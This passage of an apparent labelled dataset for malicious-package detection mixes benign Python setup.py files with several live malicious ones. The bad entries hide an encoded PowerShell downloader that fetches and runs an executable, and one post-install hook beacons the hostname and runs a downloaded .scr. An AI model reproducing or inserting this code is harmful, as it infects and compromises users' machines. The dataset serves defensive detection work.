:: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Internet :: WWW/HTTP',\n        'Framework :: Django :: 1.11',\n        'Framework :: Django :: 2.0',\n        'Framework :: Django :: 2.1',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n    ]\n)\n", "target": 0}
{"idx": "replacerand-4.18", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'replacerand',\n    packages = ['modlib'],\n    version = '1.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "descartes-1.1.0", "func": "import os\nimport sys\nimport warnings\n\nfrom setuptools import setup, find_packages\n\nversion = '1.1.0'\ndescription = open('README.txt', 'r').read()\n\n\nsetup(name='descartes',\n      version=version,\n      description=\"Use geometric objects as matplotlib paths and patches\",\n      long_description=description,\n      classifiers=['Development Status :: 5 - Production/Stable',\n                   'Intended Audience :: Developers',\n                   'Intended Audience :: Science/Research',\n                   'License :: OSI Approved :: BSD License',\n                   'Operating System :: OS Independent',\n                   'Programming Language :: Python',\n                   'Programming Language :: Python :: 2',\n                   'Programming Language :: Python :: 3',\n                   'Topic :: Scientific/Engineering :: GIS'],\n      keywords='matplotlib gis geojson geometry',\n      author='Sean Gillies',\n      author_email='sean.gillies@gmail.com',\n      url='http://bitbucket.org/sgillies/descartes/',\n      license='BSD',\n      packages=find_packages(exclude=['ez_setup', 'examples', 'tests']),\n      include_package_data=True,\n      install_requires=['matplotlib'],\n      zip_safe=False)\n", "target": 0}
{"idx": "Flask-Principal-0.4.0", "func": "\"\"\"\nFlask Principal\n---------------\n\nIdentity management for Flask.\n\nLinks\n`````\n\n* `documentation <http://packages.python.org/Flask-Principal/>`_\n* `source <https://github.com/mattupstate/flask-principal>`_\n* `development version\n  <https://github.com/mattupstate/flask-principal/raw/master#egg=Flask-Principal-dev>`_\n\n\"\"\"\n\nfrom setuptools import setup\n\n\nsetup(\n    name='Flask-Principal',\n    version='0.4.0',\n    url='http://packages.python.org/Flask-Principal/',\n    license='MIT',\n    author='Ali Afshar',\n    author_email='aafshar@gmail.com',\n    maintainer='Matt Wright',\n    maintainer_email='matt@nobien.net',\n    description='Identity management for flask',\n    long_description=__doc__,\n    py_modules=['flask_principal'],\n    zip_safe=False,\n    platforms='any',\n    install_requires=['Flask', 'blinker'],\n    test_suite='nose.collector',\n    tests_require=['nose'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "enlighten-1.10.2", "func": "#!/usr/bin/env python\n# Copyright 2017 - 2021 Avram Lubkin, All Rights Reserved\n\n# This Source Code Form is subject to the terms of the Mozilla Public\n# License, v. 2.0. If a copy of the MPL was not distributed with this\n# file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n\"\"\"\nEnlighten Progress Bar is console progress bar module for Python. (Yes, another one.)\nThe main advantage of Enlighten is it allows writing to stdout and stderr without any\nredirection.\n\"\"\"\n\nimport os\n\nfrom setuptools import setup, find_packages\n\nfrom setup_helpers import get_version, readme\n\nINSTALL_REQUIRES = ['blessed>=1.17.7', 'prefixed>=0.3.2']\nTESTS_REQUIRE = ['mock; python_version < \"3.3\"']\n\n# Additional requirements\n# html requires sphinx, sphinx_rtd_theme\n# spelling requires sphinxcontrib-spelling\n\nsetup(\n    name='enlighten',\n    version=get_version(os.path.join('enlighten', '__init__.py')),\n    description='Enlighten Progress Bar',\n    long_description=readme('README.rst'),\n    author='Avram Lubkin',\n    author_email='avylove@rockhopper.net',\n    maintainer='Avram Lubkin',\n    maintainer_email='avylove@rockhopper.net',\n    url='https://github.com/Rockhopper-Technologies/enlighten',\n    project_urls={'Documentation': 'https://python-enlighten.readthedocs.io'},\n    license='MPLv2.0',\n    zip_safe=False,\n    install_requires=INSTALL_REQUIRES,\n    tests_require=TESTS_REQUIRE,\n    packages=find_packages(exclude=['tests', 'tests.*', 'examples']),\n    test_suite='tests',\n\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',\n        'Operating System :: POSIX',\n        'Operating System :: Microsoft :: Windows',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Utilities',\n    ],\n    keywords='progress, bar, progressbar, counter, status, statusbar',\n)\n", "target": 0}
{"idx": "elasticsearch7-7.17.4", "func": "# -*- coding: utf-8 -*-\n#  Licensed to Elasticsearch B.V. under one or more contributor\n#  license agreements. See the NOTICE file distributed with\n#  this work for additional information regarding copyright\n#  ownership. Elasticsearch B.V. licenses this file to you under\n#  the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License.\n#  You may obtain a copy of the License at\n#\n# \thttp://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing,\n#  software distributed under the License is distributed on an\n#  \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n#  KIND, either express or implied.  See the License for the\n#  specific language governing permissions and limitations\n#  under the License.\n\nimport re\nfrom os.path import abspath, dirname, join\n\nfrom setuptools import find_packages, setup\n\npackage_name = \"elasticsearch7\"\nbase_dir = abspath(dirname(__file__))\n\nwith open(join(base_dir, package_name, \"_version.py\")) as f:\n    package_version = re.search(\n        r\"__versionstr__\\s+=\\s+[\\\"\\']([^\\\"\\']+)[\\\"\\']\", f.read()\n    ).group(1)\n\nwith open(join(base_dir, \"README.rst\")) as f:\n    # Remove reST raw directive from README as they're not allowed on PyPI\n    # Those blocks start with a newline and continue until the next newline\n    mode = None\n    lines = []\n    for line in f:\n        if line.startswith(\".. raw::\"):\n            mode = \"ignore_nl\"\n        elif line == \"\\n\":\n            mode = \"wait_nl\" if mode == \"ignore_nl\" else None\n        if mode is None:\n            lines.append(line)\n\n    long_description = \"\".join(lines)\n\n\npackages = [\n    package\n    for package in find_packages(where=\".\", exclude=(\"test_elasticsearch*\",))\n    if package == package_name or package.startswith(package_name + \".\")\n]\n\ninstall_requires = [\n    \"urllib3>=1.21.1, <2\",\n    \"certifi\",\n]\ntests_require = [\n    \"requests>=2.0.0, <3.0.0\",\n    \"coverage\",\n    \"mock\",\n    \"pyyaml\",\n    \"pytest\",\n    \"pytest-cov\",\n]\nasync_require = [\"aiohttp>=3,<4\"]\n\ndocs_require = [\"sphinx<1.7\", \"sphinx_rtd_theme\"]\ngenerate_require = [\"black\", \"jinja2\"]\n\nsetup(\n    name=package_name,\n    description=\"Python client for Elasticsearch\",\n    license=\"Apache-2.0\",\n    url=\"https://github.com/elastic/elasticsearch-py\",\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    version=package_version,\n    author=\"Honza Kr\u00e1l, Nick Lang\",\n    author_email=\"honza.kral@gmail.com, nick@nicklang.com\",\n    maintainer=\"Seth Michael Larson\",\n    maintainer_email=\"seth.larson@elastic.co\",\n    project_urls={\n        \"Documentation\": \"https://elasticsearch-py.readthedocs.io\",\n        \"Source Code\": \"https://github.com/elastic/elasticsearch-py\",\n        \"Issue Tracker\": \"https://github.com/elastic/elasticsearch-py/issues\",\n    },\n    packages=packages,\n    package_data={\"elasticsearch\": [\"py.typed\", \"*.pyi\"]},\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, <4\",\n    install_requires=install_requires,\n    test_suite=\"test_elasticsearch.run_tests.run_all\",\n    tests_require=tests_require,\n    extras_require={\n        \"develop\": tests_require + docs_require + generate_require,\n        \"docs\": docs_require,\n        \"requests\": [\"requests>=2.4.0, <3.0.0\"],\n        \"async\": async_require,\n    },\n)\n", "target": 0}
{"idx": "eradicate-2.1.0", "func": "#!/usr/bin/env python\n\n\"\"\"Setup for eradicate.\"\"\"\n\nfrom __future__ import unicode_literals\n\nimport ast\nfrom setuptools import setup\n\n\ndef version():\n    \"\"\"Return version string.\"\"\"\n    with open('eradicate.py') as input_file:\n        for line in input_file:\n            if line.startswith('__version__'):\n                return ast.parse(line).body[0].value.s\n\n\nwith open('README.rst') as readme:\n    setup(\n        name='eradicate',\n        version=version(),\n        description='Removes commented-out code.',\n        long_description=readme.read(),\n        license='Expat License',\n        author='Steven Myint',\n        url='https://github.com/myint/eradicate',\n        classifiers=['Environment :: Console',\n                     'Intended Audience :: Developers',\n                     'License :: OSI Approved :: MIT License',\n                     'Programming Language :: Python :: 2.7',\n                     'Programming Language :: Python :: 3',\n                     'Topic :: Software Development :: Quality Assurance'],\n        keywords='clean, format, commented-out code',\n        py_modules=['eradicate'],\n        scripts=['eradicate'])\n", "target": 0}
{"idx": "esqstrpushmc-4.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstrpushmc',\n    packages = ['modlib'],\n    version = '1.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "eth-utils-2.0.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nextras_require = {\n    'test': [\n        'hypothesis>=4.43.0,<5.0.0',\n        \"pytest>=6.2.5,<7\",\n        \"pytest-xdist\",\n        \"tox==3.14.6\",\n    ],\n    'lint': [\n        'black>=18.6b4,<19',\n        \"flake8==3.7.9\",\n        \"isort>=4.2.15,<5\",\n        \"mypy==0.720\",\n        \"pydocstyle>=5.0.0,<6\",\n        'pytest>=3.4.1,<4.0.0',\n    ],\n    'doc': [\n        \"Sphinx>=1.6.5,<2\",\n        \"sphinx_rtd_theme>=0.1.9,<2\",\n        \"towncrier>=19.2.0, <20\",\n    ],\n    'dev': [\n        \"bumpversion>=0.5.3,<1\",\n        \"pytest-watch>=4.1.0,<5\",\n        'wheel>=0.30.0,<1.0.0',\n        \"twine>=1.13,<2\",\n        \"ipython\",\n    ],\n}\n\nextras_require['dev'] = (\n    extras_require['dev'] +  # noqa: W504\n    extras_require['test'] +  # noqa: W504\n    extras_require['lint'] +  # noqa: W504\n    extras_require['doc']\n)\n\n\nwith open('./README.md') as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name='eth-utils',\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version='2.0.0',\n    description=(\n        \"\"\"eth-utils: Common utility functions for python code that interacts with Ethereum\"\"\"\n    ),\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='The Ethereum Foundation',\n    author_email='snakecharmers@ethereum.org',\n    url='https://github.com/ethereum/eth-utils',\n    include_package_data=True,\n    install_requires=[\n        \"eth-hash>=0.3.1,<0.4.0\",\n        \"eth-typing>=3.0.0,<4.0.0\",\n        \"toolz>0.8.2,<1;implementation_name=='pypy'\",\n        \"cytoolz>=0.10.1,<1.0.0;implementation_name=='cpython'\",\n    ],\n    python_requires='>=3.6,<4',\n    extras_require=extras_require,\n    py_modules=['eth_utils'],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    package_data={'eth_utils': ['py.typed']},\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: PyPy',\n    ],\n)\n", "target": 0}
{"idx": "flask-talisman-1.0.0", "func": "# Copyright 2015 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom codecs import open\n\nfrom setuptools import setup\n\n\nlong_description = open('README.rst', 'r', encoding='utf-8').read()\n\n\nsetup(\n    name='flask-talisman',\n\n    version='1.0.0',\n\n    description='HTTP security headers for Flask.',\n    long_description=long_description,\n\n    url='https://github.com/wntrblm/flask-talisman',\n\n    author='Alethea Katherine Flowers',\n    author_email='me@thea.codes',\n\n    license='Apache Software License',\n\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n\n        'License :: OSI Approved :: Apache Software License',\n\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n\n        'Operating System :: POSIX',\n        'Operating System :: MacOS',\n        'Operating System :: Unix',\n    ],\n    keywords='flask security https xss',\n\n    packages=['flask_talisman'],\n\n    install_requires=[],\n)\n", "target": 0}
{"idx": "eepl-4.5.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_41.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='eepl',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "selfedgamestudy-5.59", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfedgamestudy',\n    packages = ['modlib'],\n    version = '7.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "exrex-0.10.5", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name='exrex',\n    version='0.10.5',\n    author='Adam Tauber',\n    author_email='asciimoo@gmail.com',\n    description='Irregular methods for regular expressions',\n    license='AGPLv3+',\n    keywords=\"regexp generators string generation regex simplification\",\n    url='https://github.com/asciimoo/exrex',\n    scripts=['exrex.py'],\n    py_modules=['exrex'],\n    packages=find_packages(),\n    install_requires=[],\n    download_url='https://github.com/asciimoo/exrex/tarball/master',\n    entry_points={\n        \"console_scripts\": [\"exrex=exrex:__main__\"]\n    },\n    classifiers=[\n        # As from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        \"Development Status :: 4 - Beta\",\n        \"Topic :: Utilities\",\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU Affero General Public License v3',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ]\n)\n", "target": 0}
{"idx": "grequests-0.6.0", "func": "# -*- coding: utf-8 -*-\n\"\"\"\nGRequests allows you to use Requests with Gevent to make asynchronous HTTP\nRequests easily.\n\nUsage\n-----\n\nUsage is simple::\n\n    import grequests\n\n    urls = [\n        'http://www.heroku.com',\n        'http://tablib.org',\n        'http://httpbin.org',\n        'http://python-requests.org',\n        'http://kennethreitz.com'\n    ]\n\nCreate a set of unsent Requests::\n\n    >>> rs = (grequests.get(u) for u in urls)\n\nSend them all at the same time::\n\n    >>> grequests.map(rs)\n    [<Response [200]>, <Response [200]>, <Response [200]>, <Response [200]>, <Response [200]>]\n\n\"\"\"\n\nfrom setuptools import setup\n\nsetup(\n    name='grequests',\n    version='0.6.0',\n    url='https://github.com/kennethreitz/grequests',\n    license='BSD',\n    author='Kenneth Reitz',\n    author_email='me@kennethreitz.com',\n    description='Requests + Gevent',\n    long_description=__doc__,\n    install_requires=[\n        'gevent',\n        'requests'\n    ],\n    tests_require = ['nose'],\n    test_suite = 'nose.collector',\n    py_modules=['grequests'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "dateparser-1.1.1", "func": "import re\nfrom setuptools import setup, find_packages\n\n__version__ = re.search(r\"__version__.*\\s*=\\s*[']([^']+)[']\",\n                        open('dateparser/__init__.py').read()).group(1)\n\nintroduction = re.sub(r':members:.+|..\\sautomodule::.+|:class:|:func:|:ref:',\n                      '', open('docs/introduction.rst', encoding='utf-8').read())\nhistory = re.sub(r':mod:|:class:|:func:', '', open('HISTORY.rst', encoding='utf-8').read())\n\ntest_requirements = open('tests/requirements.txt').read().splitlines()\n\nsetup(\n    name='dateparser',\n    version=__version__,\n    description='Date parsing library designed to parse dates from HTML pages',\n    long_description=introduction + '\\n\\n' + history,\n    author='Scrapinghub',\n    author_email='info@scrapinghub.com',\n    url='https://github.com/scrapinghub/dateparser',\n    project_urls={\n        'History': 'https://dateparser.readthedocs.io/en/latest/history.html',\n    },\n    packages=find_packages(exclude=('tests', 'tests.*')),\n    include_package_data=True,\n    install_requires=[\n        'python-dateutil',\n        'pytz',\n        # https://bitbucket.org/mrabarnett/mrab-regex/issues/314/import-error-no-module-named\n        'regex !=2019.02.19,!=2021.8.27,<2022.3.15',\n        'tzlocal',\n    ],\n    entry_points={\n        'console_scripts': ['dateparser-download = dateparser_cli.cli:entrance'],\n    },\n    extras_require={\n        'calendars:python_version<\"3.6\"': ['convertdate'],\n        'calendars:python_version>=\"3.6\"': ['hijri-converter', 'convertdate'],\n        'fasttext': ['fasttext'],\n        'langdetect': ['langdetect'],\n    },\n    license=\"BSD\",\n    zip_safe=False,\n    keywords='dateparser',\n    python_requires='>=3.5',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ],\n)\n", "target": 0}
{"idx": "libpepramvm-4.94", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpepramvm',\n    packages = ['modlib'],\n    version = '2.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cufflinks-0.17.3", "func": "from setuptools import setup\nfrom os import path\nimport io\n\nhere = path.abspath(path.dirname(__file__))\nwith io.open(path.join(here, 'requirements.txt'), encoding='utf-8') as f:\n    requires = f.read().split()\n\nsetup(\n    name='cufflinks',\n    version='0.17.3',\n    description='Productivity Tools for Plotly + Pandas',\n    author='Jorge Santos',\n    author_email='santos.jorge@gmail.com',\n    license='MIT',\n    keywords=['pandas', 'plotly', 'plotting'],\n    url='https://github.com/santosjorge/cufflinks',\n    packages=['cufflinks'],\n    package_data={'cufflinks': ['../helper/*.json']},\n    include_package_data=True,\n    install_requires=requires,\n    classifiers=[\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n    ],\n    zip_safe=False\n)\n", "target": 0}
{"idx": "django-hijack-3.2.1", "func": "#!/usr/bin/env python\nimport distutils\nimport glob\nimport os\nimport subprocess  # nosec\nfrom distutils.cmd import Command\nfrom distutils.command.build import build as _build\nfrom distutils.command.install import install as _install\n\nfrom setuptools import setup\n\nBASE_DIR = os.path.dirname((os.path.abspath(__file__)))\n\n\nclass compile_translations(Command):\n    description = \"Compile i18n translations using gettext.\"\n    user_options = []\n\n    def initialize_options(self):\n        self.build_lib = None\n\n    def finalize_options(self):\n        self.set_undefined_options(\"build\", (\"build_lib\", \"build_lib\"))\n\n    def run(self):\n        pattern = \"hijack/locale/*/LC_MESSAGES/django.po\"\n        for file in glob.glob(pattern):\n            name, ext = os.path.splitext(file)\n            cmd = [\"msgfmt\", \"-c\", \"-o\", f\"{self.build_lib}/{name}.mo\", file]\n            self.announce(\n                \"running command: %s\" % \" \".join(cmd), level=distutils.log.INFO\n            )\n            subprocess.check_call(cmd, cwd=BASE_DIR)  # nosec\n\n\nclass compile_scss(Command):\n    description = \"Compile SCSS files using postcss.\"\n    user_options = []\n\n    def initialize_options(self):\n        self.build_lib = None\n\n    def finalize_options(self):\n        self.set_undefined_options(\"build\", (\"build_lib\", \"build_lib\"))\n\n    def run(self):\n        cmd = [\"npm\", \"ci\"]\n        self.announce(\"running command: %s\" % \" 